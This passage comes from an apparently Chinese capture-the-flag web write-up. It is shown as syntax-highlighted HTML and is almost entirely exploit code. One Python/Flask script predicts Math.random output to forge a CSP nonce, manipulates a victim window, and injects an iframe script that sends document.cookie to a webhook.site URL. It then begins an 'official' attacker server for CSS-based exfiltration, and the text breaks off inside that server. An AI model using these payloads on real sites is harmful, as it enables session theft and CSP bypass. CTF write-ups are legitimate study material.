class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> struct, time</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> md5</span><br><span class=\"line\"><span class=\"keyword\">from</span> tqdm <span class=\"keyword\">import</span> trange</span><br><span class=\"line\"></span><br><span class=\"line\">alphabet =  <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_same_for</span>(<span class=\"params\">alphabet</span>):</span><br><span class=\"line\">    sames_for = []</span><br><span class=\"line\">    alphas = <span class=\"built_in\">len</span>(alphabet)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(alphas):</span><br><span class=\"line\">        start = i / alphas</span><br><span class=\"line\">        end = (i + <span class=\"number\">1</span>) / alphas</span><br><span class=\"line\">        float_begin = struct.pack(<span class=\"string\">&quot;d&quot;</span>, start + <span class=\"number\">1</span>)</span><br><span class=\"line\">        float_end = struct.pack(<span class=\"string\">&quot;d&quot;</span>, end + <span class=\"number\">1</span>)</span><br><span class=\"line\">        uint_begin = struct.unpack(<span class=\"string\">&quot;&lt;Q&quot;</span>, float_begin)[<span class=\"number\">0</span>] &amp; ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">52</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        uint_end = (struct.unpack(<span class=\"string\">&quot;&lt;Q&quot;</span>, float_end)[<span class=\"number\">0</span>] - <span class=\"number\">1</span>) &amp; ((<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">52</span>) - <span class=\"number\">1</span>)</span><br><span class=\"line\">        x, y = <span class=\"built_in\">bin</span>(uint_begin)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">52</span>), <span class=\"built_in\">bin</span>(uint_end)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">52</span>)</span><br><span class=\"line\">        sames = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> x[sames] == y[sames]:</span><br><span class=\"line\">            sames += <span class=\"number\">1</span></span><br><span class=\"line\">        sames_for.append((<span class=\"built_in\">int</span>(x[:sames], <span class=\"number\">2</span>) <span class=\"keyword\">if</span> sames <span class=\"keyword\">else</span> <span class=\"number\">0</span>, sames))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sames_for</span><br><span class=\"line\"></span><br><span class=\"line\">sames_for = generate_same_for(alphabet)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">question, alphabet, sames_for</span>):</span><br><span class=\"line\">    sequence = [alphabet.index(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> question]</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_solution</span>(<span class=\"params\">prefix_count</span>):</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_left_shift</span>(<span class=\"params\">state, n</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> state[n:] + [<span class=\"number\">0</span>]*n</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_right_shift</span>(<span class=\"params\">state, n</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [<span class=\"number\">0</span>]*n + state[:-n]</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">make_xor</span>(<span class=\"params\">s1, s2</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [s1[i]^s2[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>)]</span><br><span class=\"line\">        As = []</span><br><span class=\"line\">        bs = []</span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">add_equs</span>(<span class=\"params\">ss, vals, cnt</span>):</span><br><span class=\"line\">            <span class=\"keyword\">nonlocal</span> As, bs</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(cnt):</span><br><span class=\"line\">                As.append(ss[i])</span><br><span class=\"line\">                bs.append((vals&gt;&gt;(cnt-<span class=\"number\">1</span>-i))&amp;<span class=\"number\">1</span>)</span><br><span class=\"line\">        matched = <span class=\"number\">0</span></span><br><span class=\"line\">        cur = <span class=\"number\">0</span></span><br><span class=\"line\">        se_state0 = [<span class=\"number\">1</span>&lt;&lt;i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>)]</span><br><span class=\"line\">        se_state1 = [<span class=\"number\">1</span>&lt;&lt;i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>, <span class=\"number\">128</span>)]</span><br><span class=\"line\">        <span class=\"keyword\">while</span> matched &lt; <span class=\"built_in\">len</span>(sequence):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">                se_s1 = se_state0</span><br><span class=\"line\">                se_s0 = se_state1</span><br><span class=\"line\">                se_state0 = se_s0</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_left_shift(se_s1, <span class=\"number\">23</span>))</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_right_shift(se_s1, <span class=\"number\">17</span>))</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, se_s0)</span><br><span class=\"line\">                se_s1 = make_xor(se_s1, make_right_shift(se_s0, <span class=\"number\">26</span>))</span><br><span class=\"line\">                se_state1 = se_s1</span><br><span class=\"line\">                correct_index = <span class=\"number\">64</span> - <span class=\"number\">1</span> - i + cur - prefix_count</span><br><span class=\"line\">                <span class=\"keyword\">if</span> correct_index &gt;= <span class=\"number\">0</span> <span class=\"keyword\">and</span> correct_index &lt; <span class=\"built_in\">len</span>(sequence):</span><br><span class=\"line\">                    uu = sames_for[sequence[correct_index]]</span><br><span class=\"line\">                    add_equs(se_state0, uu[<span class=\"number\">0</span>], uu[<span class=\"number\">1</span>])</span><br><span class=\"line\">                    matched += <span class=\"number\">1</span></span><br><span class=\"line\">            cur += <span class=\"number\">64</span></span><br><span class=\"line\">        BAs = [<span class=\"number\">0</span>]*<span class=\"number\">128</span></span><br><span class=\"line\">        Bbs = [<span class=\"number\">0</span>]*<span class=\"number\">128</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(As)):</span><br><span class=\"line\">            A, b = As[i], bs[i]</span><br><span class=\"line\">            listed = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> ((A&gt;&gt;j)&amp;<span class=\"number\">1</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> BAs[j] == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    BAs[j] = A</span><br><span class=\"line\">                    Bbs[j] = b</span><br><span class=\"line\">                    listed = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    A ^= BAs[j]</span><br><span class=\"line\">                    b ^= Bbs[j]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> listed <span class=\"keyword\">and</span> b:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>)[::-<span class=\"number\">1</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> BAs[i] != <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, <span class=\"number\">128</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (BAs[i]&gt;&gt;j)&amp;<span class=\"number\">1</span>:</span><br><span class=\"line\">                    Bbs[i] ^= Bbs[j]</span><br><span class=\"line\">        se_state0 = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Bbs[:<span class=\"number\">64</span>]]), <span class=\"number\">2</span>)</span><br><span class=\"line\">        se_state1 = <span class=\"built_in\">int</span>(<span class=\"string\">&#x27;&#x27;</span>.join([<span class=\"built_in\">str</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Bbs[<span class=\"number\">64</span>:]]), <span class=\"number\">2</span>)</span><br><span class=\"line\">        generated = <span class=\"number\">0</span></span><br><span class=\"line\">        full = []</span><br><span class=\"line\">        <span class=\"keyword\">while</span> generated &lt; <span class=\"built_in\">len</span>(sequence) + prefix_count + <span class=\"number\">128</span>:</span><br><span class=\"line\">            cached = []</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">                se_s1 = se_state0</span><br><span class=\"line\">                se_s0 = se_state1</span><br><span class=\"line\">                se_state0 = se_s0</span><br><span class=\"line\">                se_s1 ^= (se_s1 &lt;&lt; <span class=\"number\">23</span>) &amp; <span class=\"number\">0xffffffffffffffff</span></span><br><span class=\"line\">                se_s1 ^= se_s1 &gt;&gt; <span class=\"number\">17</span></span><br><span class=\"line\">                se_s1 ^= se_s0</span><br><span class=\"line\">                se_s1 ^= se_s0 &gt;&gt; <span class=\"number\">26</span></span><br><span class=\"line\">                se_state1 = se_s1</span><br><span class=\"line\">                cached.append(struct.unpack(<span class=\"string\">&quot;d&quot;</span>, struct.pack(<span class=\"string\">&quot;&lt;Q&quot;</span>, (se_state0 &gt;&gt; <span class=\"number\">12</span>) | <span class=\"number\">0x3FF0000000000000</span>))[<span class=\"number\">0</span>] - <span class=\"number\">1</span>)</span><br><span class=\"line\">            generated += <span class=\"number\">64</span></span><br><span class=\"line\">            full += cached[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">        full = full[prefix_count:]</span><br><span class=\"line\">        full = <span class=\"string\">&#x27;&#x27;</span>.join([alphabet[<span class=\"built_in\">int</span>(v * <span class=\"built_in\">len</span>(alphabet))] <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> full])</span><br><span class=\"line\">        <span class=\"keyword\">assert</span> full[:<span class=\"built_in\">len</span>(sequence)] == question</span><br><span class=\"line\">        ans = full[<span class=\"built_in\">len</span>(sequence):][:<span class=\"number\">128</span>]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ans</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">        ret = test_solution(i)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ret:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret</span><br><span class=\"line\">    <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;no solution&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"></span><br><span class=\"line\">sess = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">login</span>(<span class=\"params\">username, password</span>):</span><br><span class=\"line\">    <span class=\"keyword\">global</span> sess</span><br><span class=\"line\">    sess = requests.Session()</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/login&#x27;</span></span><br><span class=\"line\">    sess.post(url, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;username&#x27;</span>: username,</span><br><span class=\"line\">        <span class=\"string\">&#x27;password&#x27;</span>: password</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write</span>(<span class=\"params\">title, content</span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/write&#x27;</span></span><br><span class=\"line\">    r = sess.post(url, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;title&#x27;</span>: title,</span><br><span class=\"line\">        <span class=\"string\">&#x27;content&#x27;</span>: content</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">share</span>(<span class=\"params\"><span class=\"built_in\">id</span>=<span class=\"number\">0</span></span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3.37.109.189:8080/share_diary/0&#x27;</span></span><br><span class=\"line\">    r = sess.get(url)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;head&gt;&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">            const genNonce = () =&gt; &quot;_&quot;.repeat(8).replace(/_/g,()=&gt;&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;.charAt(Math.random()*36));</span></span><br><span class=\"line\"><span class=\"string\">            async function cc() &#123;</span></span><br><span class=\"line\"><span class=\"string\">                const url = &#x27;http://localhost&#x27;</span></span><br><span class=\"line\"><span class=\"string\">                let code = &#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">                for (let i = 0; i &lt; 15; i++) &#123;</span></span><br><span class=\"line\"><span class=\"string\">                    let resp = await fetch(&#x27;http://3.37.109.189:8080&#x27; + &#x27;/share/read&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">                    let text = await resp.text();</span></span><br><span class=\"line\"><span class=\"string\">                    code += text.match(/nonce-[0-9a-z]+/)?.at(0).replace(&#x27;nonce-&#x27;, &#x27;&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">                &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">                const userId = genNonce();</span></span><br><span class=\"line\"><span class=\"string\">                let extra = open(url + &#x27;/share/read#id=0&amp;username=&#x27; + encodeURIComponent(userId)) // will NOT throw exception if not created</span></span><br><span class=\"line\"><span class=\"string\">                console.log(code);</span></span><br><span class=\"line\"><span class=\"string\">                let resp = await fetch(&#x27;/solve?q=&#x27; + encodeURIComponent(code) + &#x27;&amp;u=&#x27; + encodeURIComponent(userId)); // get predicted nonce from server (with note created)</span></span><br><span class=\"line\"><span class=\"string\">                let text = await resp.text();</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">                setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                    extra.location.href = &quot;http://&quot; + location.host + &quot;/solve&quot;;</span></span><br><span class=\"line\"><span class=\"string\">                    setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                        extra.history.go(-1); // reload, but with bfcache so that nonce won&#x27;t change, and refresh the `hashchange` event trigger that has been deleted</span></span><br><span class=\"line\"><span class=\"string\">                        setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                            extra.location.href = url + &#x27;/share/read#id=0&amp;username=&#x27; + encodeURIComponent(userId)+&#x27;&amp;34sdctycv&#x27;; // trigger `hashchange`</span></span><br><span class=\"line\"><span class=\"string\">                    &#125;,1000)</span></span><br><span class=\"line\"><span class=\"string\">                    &#125;,1000)</span></span><br><span class=\"line\"><span class=\"string\">                &#125;, 1000);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            cc().catch((e)=&gt;&#123;fetch(&#x27;https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/&#x27;+e.toString())&#125;);</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/solve&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sol</span>():</span><br><span class=\"line\">    question = request.form.get(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> question:</span><br><span class=\"line\">        question = request.args.get(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> question:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;no question&quot;</span></span><br><span class=\"line\">    ans = solve(question, alphabet, sames_for)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(ans)</span><br><span class=\"line\">    user = request.args.get(<span class=\"string\">&#x27;u&#x27;</span>)</span><br><span class=\"line\">    login(user, user)</span><br><span class=\"line\">    write(<span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">f&#x27;&lt;iframe srcdoc=&quot;&lt;script nonce=<span class=\"subst\">&#123;ans[:<span class=\"number\">16</span>]&#125;</span>&gt;fetch(`https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/?a=`+document.cookie)&lt;/script&gt;&quot;&gt;&lt;iframe&gt;&#x27;</span>)</span><br><span class=\"line\">    share()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;hello&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.run(<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"number\">5000</span>)</span><br></pre></td></tr></table></figure>\n<p>附官方WP（使用socket进行通信持续控制页面，基于事件触发需要的更新，攻击者动态返回所需CSS）:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,request</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_socketio <span class=\"keyword\">import</span> SocketIO</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">&#x27;SECRET_KEY&#x27;</span>] = <span class=\"string\">&#x27;test1234&#x27;</span></span><br><span class=\"line\">socketio = SocketIO(app,cors_allowed_origins=<span class=\"string\">&quot;*&quot;</span>)</span><br><span class=\"line\">nonce = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">self_url = <span class=\"string\">&quot;http://141.164.55.51:8000/gen_exfil_css?nonce=&quot;</span></span><br><span class=\"line\">s = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@socketio.on(<span class=\"params\"><span class=\"string\">&#x27;start&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">handle_my_custom_event</span>(<span class=\"params\">methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;start&#x27;</span>)</span><br><span class=\"line\">    socketio.emit(<span 